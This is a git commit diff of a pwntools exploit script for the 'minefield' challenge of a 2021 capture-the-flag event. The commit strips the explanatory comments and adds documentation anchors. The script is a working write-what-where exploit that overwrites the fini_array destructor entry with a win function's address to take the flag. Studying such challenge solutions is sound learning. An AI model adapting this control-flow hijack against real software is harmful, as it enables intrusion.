c34d0511f063d8c9629274797055ffeecf215488
LightDiscord <root@arnaud.sh>
2021-04-24 14:08:01 +0200

    anchor for minefield

--- src/cyber-apocalypse-2021/pwn/minefield/attack.py
+++ src/cyber-apocalypse-2021/pwn/minefield/attack.py
@@ -1,40 +1,30 @@
 from pwn import *
 
-# For this challenge we don't have the libc so first thing we do is to
-# disassemble the program to know what it does.
 
 elf = ELF("./challenge/minefield")
 
 conn = remote(MACHINE_IP, MACHINE_PORT)
 
-# This one doesn't do a lot, it's not a buffer overflow or something like this.
-# All it does is write what we want where we want.
+progress = log.progress("retrieving flag")
 
-with log.progress("retrieving flag") as progress:
-    # First thing we need to do is navigate through the menus to plant the value
-    # we want.
-    progress.status("choose to plant a mine");
-    conn.recvlines(3)
-    conn.sendline('2')
+# ANCHOR: choose_menu
+progress.status("choose to plant a mine");
+conn.recvlines(3)
+conn.sendline('2')
+# ANCHOR_END: choose_menu
 
-    # Here it asks us what type of mine we want to plant but in reality it's
-    # where we want to set the value.
-    # One good candidate is where is stored the function that runs destructors
-    # at the end of the program, the value of this function is stored behind
-    # the `__do_global_dtors_aux_fini_array_entry` symbol.
-    progress.status("choose where to plant the mine")
-    conn.recvuntil("Insert type of mine: ")
-    conn.sendline('0x%x' % elf.symbols["__do_global_dtors_aux_fini_array_entry"])
+# ANCHOR: www_where
+progress.status("choose where to plant the mine")
+conn.recvuntil("Insert type of mine: ")
+conn.sendline('0x%x' % elf.symbols["__do_global_dtors_aux_fini_array_entry"])
+# ANCHOR_END: www_where
 
-    # Next we need to set the value we want, so what we'll send is the address
-    # of the function we wish to execute.
-    # By disassembling the binary we can find a function named `_` that will
-    # print the flag to us, so here's our win function.
-    progress.status("choose what value to set the mine")
-    conn.recvuntil("Insert location to plant: ")
-    conn.sendline('0x%x' % elf.symbols["_"])
+# ANCHOR: www_what
+progress.status("choose what value to set the mine")
+conn.recvuntil("Insert location to plant: ")
+conn.sendline('0x%x' % elf.symbols["_"])
+# ANCHOR_END: www_what
 
-    # Now the bomb as been planted and we've the flag!
-    progress.status("run for the flag")
-    conn.recvline_startswith(b"Mission accomplished!")
-    log.success(conn.recvallS())
+progress.status("run for the flag")
+conn.recvline_startswith(b"Mission accomplished!")
+progress.success(conn.recvallS())
